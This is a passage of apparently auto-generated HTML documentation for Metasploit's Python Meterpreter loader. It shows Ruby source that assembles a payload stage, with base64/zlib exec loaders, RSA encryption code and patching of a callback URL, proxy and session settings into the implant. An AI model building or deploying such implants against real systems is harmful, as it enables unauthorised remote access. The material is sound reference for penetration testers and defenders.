exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder(&#39;utf-8&#39;)(&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_aes_encryptor'>aes_encryptor</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;)[0])),&#39;met_aes&#39;,&#39;exec&#39;), met_aes.__dict__)
exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder(&#39;utf-8&#39;)(&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_rsa_encryptor'>rsa_encryptor</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;)[0])),&#39;met_rsa&#39;,&#39;exec&#39;), met_rsa.__dict__)
sys.modules[&#39;met_aes&#39;] = met_aes
sys.modules[&#39;met_rsa&#39;] = met_rsa
import met_rsa, met_aes
def met_rsa_encrypt(der, msg):
  return met_rsa.rsa_enc(der, msg)
def met_aes_encrypt(key, iv, pt):
  return met_aes.AESCBC(key).encrypt(iv, pt)
def met_aes_decrypt(key, iv, pt):
  return met_aes.AESCBC(key).decrypt(iv, pt)
  </span><span class='tstring_end'>?</span></span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="python_rsa_source-instance_method">
  
    #<strong>python_rsa_source</strong>  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/meterpreter_loader.rb', line 183</span>

<span class='kw'>def</span> <span class='id identifier rubyid_python_rsa_source'>python_rsa_source</span>
  <span class='tstring'><span class='tstring_beg'>%Q?</span><span class='tstring_content'>
import sys,math,random,binascii as ba,os
from struct import unpack as u
from struct import pack
is2 = sys.version_info[0]&lt;3
def bt(b):
	if is2:
return b
	return ord(b)
def b2i(b):
	return int(ba.b2a_hex(b),16)
def i2b(i):
	h=&#39;%x&#39;%i
	if len(h)%2==1:
h =&#39;0&#39;+h
	if not is2:
h=h.encode(&#39;utf-8&#39;)
	return ba.a2b_hex(h)
def rs(a,o):
	if a[o]==bt(pack(&#39;B&#39;,0x81)):
return(u(&#39;B&#39;,a[o+1])[0],2+o)
	elif a[o] == bt(pack(&#39;B&#39;,0x82)):
return(u(&#39;&gt;H&#39;,a[o+1:o+3])[0],3+o)
def ri(b,o):
	i,o =rs(b,o)
	return(b[o:o+i],o+i)
def b2me(b):
	if b[0]!=bt(pack(&#39;B&#39;,0x30)):
return(None,None)
	_,o=rs(b,1)
	if b[o]!=bt(pack(&#39;B&#39;,2)):
return(None,None)
	(m,o)=ri(b,o+1)
	if b[o]!=bt(pack(&#39;B&#39;,2)):
return(None,None)
	e=b[o+2:]
	return(b2i(m),b2i(e))
def der2me(d):
	if d[0]!=bt(pack(&#39;B&#39;,0x30)):
return(None,None)
	_,o=rs(d,1)
	while o&lt;len(d):
if d[o]==bt(pack(&#39;B&#39;,0x30)):
	o+=u(&#39;B&#39;,d[o+1:o+2])[0]
elif d[o]==bt(pack(&#39;B&#39;,0x05)):
	o+=2
elif d[o]==bt(pack(&#39;B&#39;,0x03)):
	_,o=rs(d,o+1)
	return b2me(d[o+1:])
else:
	return(None,None)
def rsa_enc(der,msg):
	m,e=der2me(der)
	h=pack(&#39;BB&#39;,0,2)
	d=pack(&#39;B&#39;,0)
	l=256-len(h)-len(msg)-len(d)
	p=os.urandom(512).replace(pack(&#39;B&#39;,0),pack(&#39;&#39;))
	return i2b(pow(b2i(h+p[:l]+d+msg),e,m))
</span><span class='tstring_end'>?</span></span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="stage_meterpreter-instance_method">
  
    #<strong>stage_meterpreter</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Get the raw Python Meterpreter stage and patch in values based on the configuration</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>opts</span>
      
      
        <span class='type'>(<tt>Hash</tt>)</span>
      
      
        <em class="default">(defaults to: <tt>{}</tt>)</em>
      
      
        &mdash;
        <div class='inline'>
<p>The options to use for patching the stage data.</p>
</div>
      
    </li>
  
</ul>

  
    
    
    <p class="tag_title">Options Hash (<tt>opts</tt>):</p>
    <ul class="option">
      
        <li>
          <span class="name">:http_proxy_host</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The host to use as a proxy for HTTP(S) transports.</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:http_proxy_port</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The port to use when a proxy  host is set for HTTP(S) transports.</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:url</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The HTTP(S) URL to patch in to allow use of the stage as a stageless payload.</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:http_user_agent</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The value to use for the User-Agent header for HTTP(S) transports.</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:stageless_tcp_socket_setup</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Python code to execute to setup a tcp socket to allow use of the stage as a stageless payload.</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:uuid</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>A specific UUID to use for sessions created by this stage.</p>
</div>
          
        </li>
      
    </ul>
  


</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/meterpreter_loader.rb', line 66</span>

<span class='kw'>def</span> <span class='id identifier rubyid_stage_meterpreter'>stage_meterpreter</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_ds'>ds</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:datastore</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_datastore'>datastore</span>
  <span class='id identifier rubyid_met'>met</span> <span class='op'>=</span> <span class='const'>MetasploitPayloads</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>meterpreter</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>meterpreter.py</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>

  <span class='id identifier rubyid_var_escape'>var_escape</span> <span class='op'>=</span> <span class='id identifier rubyid_lambda'>lambda</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_txt'>txt</span><span class='op'>|</span>
    <span class='id identifier rubyid_txt'>txt</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\\</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\\</span><span class='tstring_end'>&#39;</span></span> <span class='op'>*</span> <span class='int'>8</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\&#39;</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>%q(</span><span class='tstring_content'>\\\\\\\&#39;</span><span class='tstring_end'>)</span></span><span class='rparen'>)</span>
  <span class='rbrace'>}</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MeterpreterDebugBuild</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>%q|</span><span class='tstring_content'>DEBUGGING = False</span><span class='tstring_end'>|</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>%q|</span><span class='tstring_content'>DEBUGGING = True</span><span class='tstring_end'>|</span></span><span class='rparen'>)</span>

    <span class='id identifier rubyid_logging_options'>logging_options</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../OptMeterpreterDebugLogging.html" title="Msf::OptMeterpreterDebugLogging (class)">OptMeterpreterDebugLogging</a></span></span><span class='period'>.</span><span class='id identifier rubyid_parse_logging_options'><span class='object_link'><a href="../../OptMeterpreterDebugLogging.html#parse_logging_options-class_method" title="Msf::OptMeterpreterDebugLogging.parse_logging_options (method)">parse_logging_options</a></span></span><span class='lparen'>(</span><span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MeterpreterDebugLogging</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
    <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>%q|</span><span class='tstring_content'>DEBUGGING_LOG_FILE_PATH = None</span><span class='tstring_end'>|</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>%Q|</span><span class='tstring_content'>DEBUGGING_LOG_FILE_PATH = &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_logging_options'>logging_options</span><span class='lbracket'>[</span><span class='symbol'>:rpath</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;</span><span class='tstring_end'>|</span></span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_logging_options'>logging_options</span><span class='lbracket'>[</span><span class='symbol'>:rpath</span><span class='rbracket'>]</span>
  <span class='kw'>end</span>

  <span class='kw'>unless</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MeterpreterTryToFork</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>TRY_TO_FORK = True</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>TRY_TO_FORK = False</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'># PATCH-SETUP-ENCRYPTION #</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_python_encryptor_loader'>python_encryptor_loader</span><span class='rparen'>)</span>

  <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SESSION_EXPIRATION_TIMEOUT = 604800</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SESSION_EXPIRATION_TIMEOUT = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SessionExpirationTimeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SESSION_COMMUNICATION_TIMEOUT = 300</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SESSION_COMMUNICATION_TIMEOUT = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SessionCommunicationTimeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SESSION_RETRY_TOTAL = 3600</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SESSION_RETRY_TOTAL = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SessionRetryTotal</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SESSION_RETRY_WAIT = 10</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SESSION_RETRY_WAIT = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SessionRetryWait</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>

  <span class='id identifier rubyid_uuid'>uuid</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uuid</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_generate_payload_uuid'>generate_payload_uuid</span><span class='lparen'>(</span><span class='label'>arch:</span> <span class='const'>ARCH_PYTHON</span><span class='comma'>,</span> <span class='label'>platform:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>python</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_uuid'>uuid</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_to_hex'>to_hex</span><span class='lparen'>(</span><span class='id identifier rubyid_uuid'>uuid</span><span class='period'>.</span><span class='id identifier rubyid_to_raw'>to_raw</span><span class='comma'>,</span> <span class='id identifier rubyid_prefix'>prefix</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>PAYLOAD_UUID = \&#39;\&#39;</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>PAYLOAD_UUID = \&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_uuid'>uuid</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:stageless</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='kw'>true</span>
    <span class='id identifier rubyid_session_guid'>session_guid</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>00</span><span class='tstring_end'>&#39;</span></span> <span class='op'>*</span> <span class='int'>16</span>
  <span class='kw'>else</span>
    <span class='id identifier rubyid_session_guid'>session_guid</span> <span class='op'>=</span> <span class='const'>SecureRandom</span><span class='period'>.</span><span class='id identifier rubyid_uuid'>uuid</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>-</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='kw'>end</span>
  <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SESSION_GUID = \&#39;\&#39;</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>SESSION_GUID = \&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_session_guid'>session_guid</span><span class='embexpr_end'>}</span><span class='tstring_content'>\&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>

  <span class='id identifier rubyid_http_user_agent'>http_user_agent</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:http_user_agent</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpUserAgent</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_http_proxy_host'>http_proxy_host</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:http_proxy_host</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyHost</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PROXYHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_http_proxy_port'>http_proxy_port</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:http_proxy_port</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyPort</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PROXYPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_http_proxy_user'>http_proxy_user</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:http_proxy_user</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyUser</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_http_proxy_pass'>http_proxy_pass</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:http_proxy_pass</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyPass</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_http_header_host'>http_header_host</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:header_host</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpHostHeader</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_http_header_cookie'>http_header_cookie</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:header_cookie</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpCookie</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_http_header_referer'>http_header_referer</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:header_referer</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpReferer</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>

  <span class='comment'># The callback URL can be different to the one that we&#39;re receiving from the interface
</span>  <span class='comment'># so we need to generate it
</span>  <span class='comment'># TODO: move this to somewhere more common so that it can be used across payload types
</span>  <span class='kw'>unless</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:url</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>

    <span class='comment'># Build the callback URL (TODO: share this logic with TransportConfig
</span>    <span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:url</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_reject'>reject</span><span class='lparen'>(</span><span class='op'>&amp;</span><span class='symbol'>:empty?</span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='op'>-</span><span class='int'>1</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
    <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:scheme</span><span class='rbracket'>]</span> <span class='op'>||=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:url</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>:</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_scheme'>scheme</span><span class='comma'>,</span> <span class='id identifier rubyid_lhost'>lhost</span><span class='comma'>,</span> <span class='id identifier rubyid_lport'>lport</span> <span class='op'>=</span> <span class='id identifier rubyid_transport_uri_components'>transport_uri_components</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
    <span class='id identifier rubyid_callback_url'>callback_url</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_scheme'>scheme</span><span class='embexpr_end'>}</span><span class='tstring_content'>://</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_lhost'>lhost</span><span class='embexpr_end'>}</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_lport'>lport</span><span class='embexpr_end'>}</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_luri'>luri</span><span class='embexpr_end'>}</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='embexpr_end'>}</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span>

    <span class='comment'># patch in the various payload related configuration
</span>    <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTP_CONNECTION_URL = None</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>HTTP_CONNECTION_URL = &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_callback_url'>callback_url</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTP_USER_AGENT = None</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>HTTP_USER_AGENT = &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_http_user_agent'>http_user_agent</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_http_user_agent'>http_user_agent</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
    <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTP_COOKIE = None</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>HTTP_COOKIE = &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_http_header_cookie'>http_header_cookie</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_http_header_cookie'>http_header_cookie</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
